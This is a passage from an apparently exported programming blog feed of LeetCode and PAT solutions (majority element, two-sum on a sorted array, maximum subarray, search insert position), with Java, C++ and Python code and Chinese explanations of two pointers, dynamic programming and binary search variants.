<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/majority-element</span></span><br><span class="line"><span class="comment"> * Beats : 62.58%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        Integer candidate = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                candidate = num;</span><br><span class="line">            &#125;</span><br><span class="line">            count += (num == candidate) ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> candidate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/majority-element</span></span><br><span class="line"><span class="comment"> * Beats : 18.59%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> majority = nums[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (count == <span class="number">0</span>)&#123;</span><br><span class="line">				majority = nums[i];</span><br><span class="line">			&#125;</span><br><span class="line">			count += (majority == nums[i] ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> majority;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        majority = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                majority = nums[i]</span><br><span class="line">            <span class="keyword">if</span> majority==nums[i]:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> majority</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>Boyer-Moore Voting Algorithm（多数投票算法）</tag>
      </tags>
  </entry>
  <entry>
    <title>167. Two Sum II - Input array is sorted</title>
    <url>/2018/01/28/167-Two-Sum-II-Input-array-is-sorted/</url>
    <content><![CDATA[<p>Given an array of integers that is already <strong><em>sorted in ascending order\</em></strong>, find two numbers such that they add up to a specific target number.</p>
<p>The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2.</p>
<p><strong>Note:</strong></p>
<ul>
<li>Your returned answers (both index1 and index2) are not zero-based.</li>
<li>You may assume that each input would have <em>exactly</em> one solution and you may not use the <em>same</em> element twice.</li>
</ul>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: numbers = [<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>], target = <span class="number">9</span></span><br><span class="line">Output: [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">Explanation: The sum of <span class="number">2</span> and <span class="number">7</span> is <span class="number">9</span>. Therefore index1 = <span class="number">1</span>, index2 = <span class="number">2</span>.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题目，一上来告诉你是有序数组，那其实想到了两个和有序有关的算法：二分法和双指针，但二分法是查找单个元素。那可以确定是<code>双指针</code>方法来计算了。当然这道题目，仍可以参考<code>1.TwoSum</code>的HashMap的方法，不过有了双指针这个利器，感觉双指针从易用性和理解性更优秀。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/</span></span><br><span class="line"><span class="comment"> * Beats : 40%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">        	<span class="keyword">if</span>(numbers[low]+numbers[high]&gt;target)&#123;</span><br><span class="line">        		high--;</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		<span class="keyword">if</span>(numbers[low]+numbers[high]&lt;target)&#123;</span><br><span class="line">        			low++;</span><br><span class="line">        		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        			<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;low+<span class="number">1</span>,high+<span class="number">1</span>&#125;;</span><br><span class="line">        		&#125;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/</span></span><br><span class="line"><span class="comment"> * Beats : 94.25 %;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>, high = numbers.size() - <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">		<span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">			<span class="keyword">if</span> (numbers[low] + numbers[high]&gt;target)&#123;</span><br><span class="line">				high--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (numbers[low] + numbers[high] &lt; target)&#123;</span><br><span class="line">				low++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				result.push_back(low+<span class="number">1</span>);</span><br><span class="line">				result.push_back(high+<span class="number">1</span>);</span><br><span class="line">				<span class="keyword">return</span> result;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, numbers, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type numbers: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = len(numbers)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="keyword">if</span> numbers[low] + numbers[high] &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> numbers[low] + numbers[high] &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> [low+<span class="number">1</span>,high+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>双指针的使用条件，要注意是有序数组，不是有序数组不能使用双指针和二分法，这点一定要注意。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>53. Maximum Subarray</title>
    <url>/2018/01/27/53-Maximum-Subarray/</url>
    <content><![CDATA[<p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [-<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">5</span>,<span class="number">4</span>],</span><br><span class="line">Output: <span class="number">6</span></span><br><span class="line">Explanation: [<span class="number">4</span>,-<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>] has the largest sum = <span class="number">6</span>.</span><br></pre></td></tr></table></figure>
<p><strong>Follow up:</strong></p>
<p>If you have figured out the O(<em>n</em>) solution, try coding another solution using the divide and conquer approach, which is more subtle.</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这个问题比较明显，是动态规划的问题。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/maximum-subarray/</span></span><br><span class="line"><span class="comment"> * Beats :  67.13%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> sum = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i-<span class="number">1</span>]+nums[i]&gt;nums[i])&#123;</span><br><span class="line">                dp[i] = dp[i-<span class="number">1</span>]+nums[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i] = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            sum = dp[i]&gt;sum?dp[i]:sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/maximum-subarray/</span></span><br><span class="line"><span class="comment"> * Beats : 11.94 %;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">		<span class="keyword">int</span> sum = nums[<span class="number">0</span>];</span><br><span class="line">		res.push_back(nums[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] + res[i<span class="number">-1</span>] &gt; nums[i])&#123;</span><br><span class="line">				res.push_back(nums[i] + res[i - <span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				res.push_back(nums[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			sum = res[i] &gt; sum ? res[i] : sum;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        dp = []</span><br><span class="line">        dp.append(nums[<span class="number">0</span>])</span><br><span class="line">        sum = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> dp[i<span class="number">-1</span>]+nums[i] &gt; nums[i]:</span><br><span class="line">                dp.append(dp[i - <span class="number">1</span>] + nums[i])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp.append(nums[i])</span><br><span class="line">        sum = max(dp)</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>动态规划（Dynamic Programing）问题是很有意思的。总体思路其实就是循环，不过这个循环很特殊，他的当前循环的变量是根据之前的数据得出的，有很强的规划性（根据之前数据得出当前值）。总体思路是：设计一个数组存放动态规划数据，然后再在这个动态规划数组中寻找需要的数据；一般情况下可以优化，后一步查找可以在生成动态规划数组时就完成，进而省去一个循环。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>35. Search Insert Position</title>
    <url>/2018/01/07/35-Search-Insert-Position/</url>
    <content><![CDATA[<p>Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p>
<p>You may assume no duplicates in the array.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>], <span class="number">5</span></span><br><span class="line">Output: <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>], <span class="number">2</span></span><br><span class="line">Output: <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>], <span class="number">7</span></span><br><span class="line">Output: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 4:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>], <span class="number">0</span></span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题目是针对有序数组，那么适用二分法解决。</p>
<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>二分查找的基本思路不用再说了，注意几个点：</p>
<ul>
<li><p>虽然查找条件<code>while(low&lt;=high)</code>也可以写成<code>while(low&lt;high)</code>，但是有区别，前者未找到时，low和high处于第一次<code>low&gt;high</code>的状态；而后者处于<code>low==high</code>的状态。这里统一下，用第一种方法，后面会说为什么这么做。</p>
</li>
<li><p>总是在low~mid-1和mid+1~high之间查找元素。对于mid判断完毕后，不用再包含mid。</p>
</li>
</ul>
<p><strong>二分查找基准（查找不到返回-1）</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (a[mid] &lt; x)&#123;</span><br><span class="line">			low = mid + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt; x)&#123;</span><br><span class="line">			high = mid - <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二分查找扩展"><a href="#二分查找扩展" class="headerlink" title="二分查找扩展"></a>二分查找扩展</h1><p>基于二分查找，可以进一步扩展两个方法。</p>
<ul>
<li><p>查找第一个大于或等于x的元素位置</p>
</li>
<li><p>查找第一个大于x的元素位置</p>
</li>
</ul>
<h2 id="查找第一个大于或等于x的元素位置"><a href="#查找第一个大于或等于x的元素位置" class="headerlink" title="查找第一个大于或等于x的元素位置"></a>查找第一个大于或等于x的元素位置</h2><p>原理比较简单，只需要对分支判断中的等于做相应处理即可。</p>
<p><strong>查找第一个大于或等于x的元素位置基准代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (a[mid] &lt; x)&#123;</span><br><span class="line">			low = mid + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt;= x)&#123;</span><br><span class="line">			high = mid - <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里修改了三处：第一，修改了<code>return -1</code>为<code>return low</code>；第二，修改条件<code>if (a[mid] &gt; x)</code>为<code>if (a[mid] &gt;= x)</code>；第三，删除条件<code>return mid</code>。</p>
<p><strong>分析：</strong></p>
<p>查找第一个大于或等于x的元素位置，将条件<code>if (a[mid] &gt; x)</code>改为<code>if (a[mid] &gt;= x)</code>，对于只要大于等于x的位置，都在其左半部分查找（<strong>降低high</strong>）。该条件会导致高位high不断向左靠近，直到最后一个小于x的位置。</p>
<p><strong>最终，high和low均指向最后一个小于x的位置。这里要解释下上面为什么while条件中使用<code>(low&lt;=high)</code>，当<code>while (low == high)</code>成立，条件满足<code>if (a[mid] &lt; mp) low = mid + 1;</code>，所以最终能通过low返回第一个大于等于x的索引位置。其目的就是为了保证low在等于high（指向最后一个小于x的位置）时，仍可以多一步运算而指向第一个大于等于的元素。</strong></p>
<h2 id="查找第一个大于x的元素位置"><a href="#查找第一个大于x的元素位置" class="headerlink" title="查找第一个大于x的元素位置"></a>查找第一个大于x的元素位置</h2><p>同上。只不过等于号加在另一个条件中。</p>
<p><strong>查找第一个大于x的元素位置基准代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A为递增数列，x为欲查询的数，函数返回查找到的索引，未查找到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (a[mid] &lt;= x)&#123;</span><br><span class="line">			low = mid + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &gt; x)&#123;</span><br><span class="line">			high = mid - <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与上面唯一的不同在于将等号放在了条件<code>if (a[mid] &lt;= x)</code>中，但是却将最终结果变成了查找第一个大于x的元素位置。</p>
<p><strong>分析：</strong></p>
<p>此时，对于小于等于x的情况，都是在右半部分查找（提高low），该条件会导致低位low不断向右靠近，直到最后一个小于或等于x的位置。<br>当（low==high）时，将<code>low = mid+1</code>，最终将返回第一个大于x的位置索引。</p>
<h2 id="二分查找，将未找到的元素插入到合适位置"><a href="#二分查找，将未找到的元素插入到合适位置" class="headerlink" title="二分查找，将未找到的元素插入到合适位置"></a>二分查找，将未找到的元素插入到合适位置</h2><p>这个问题其实是<strong>查找第一个大于或等于x的元素位置</strong>的不同问法而已。本质是一样的。</p>
<p>那么这道题目就是<strong>查找第一个大于或等于x的元素位置</strong>。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/search-insert-position</span></span><br><span class="line"><span class="comment"> * Beats : 90%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>,high = nums.length-<span class="number">1</span>,mid;</span><br><span class="line">        <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">            mid = low + (high-low)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">                low = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt;= target)&#123;</span><br><span class="line">                high = mid-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/search-insert-position</span></span><br><span class="line"><span class="comment"> * Beats : 90%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>, high = nums.size() - <span class="number">1</span>, mid;</span><br><span class="line">		<span class="keyword">while</span> (low &lt;= high)&#123;</span><br><span class="line">			mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (target &gt; nums[mid])&#123;</span><br><span class="line">				low = mid + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				high = mid - <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;=high):</span><br><span class="line">            mid = low + (high-low)/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span>(target &lt;= nums[mid]):</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> low</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于二分查找题目，只要判断可以用二分查找解决，那么其实可以先实现二分查找，再根据需要看看是实现：</p>
<ul>
<li><p>查找第一个大于或等于x的元素位置（等价于<strong>将未找到的元素插入到合适位置</strong>）</p>
</li>
<li><p>查找第一个大于x的元素位置</p>
</li>
</ul>
<p>这两个情况的哪一个，具体只需要看看等号是加在哪个条件上就可以决定不同的结果了。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>二分法</tag>
      </tags>
  </entry>
  <entry>
    <title>PAT B1011 A+B 和 C (15分)</title>
    <url>/2018/01/05/PAT-B1011-A-B-%E5%92%8C-C-15%E5%88%86/</url>
    <content><![CDATA[<p>给定区间 $[−2^{31},2^{31}]$ 内的 3 个整数 A、B 和 C，请判断 A+B 是否大于 C。</p>
<a id="more"></a>
<p><strong>输入格式：</strong></p>
<p>输入第 1 行给出正整数 T (≤10)，是测试用例的个数。随后给出 T 组测试用例，每组占一行，顺序给出 A、B 和 C。整数间以空格分隔。</p>
<p><strong>输出格式：</strong></p>
<p>对每组测试用例，在一行中输出 <code>Case #X: true</code> 如果 A+B&gt;C，否则输出 <code>Case #X: false</code>，其中 <code>X</code>是测试用例的编号（从 1 开始）。</p>
<p><strong>输入样例：</strong></p>
<pre><code>4
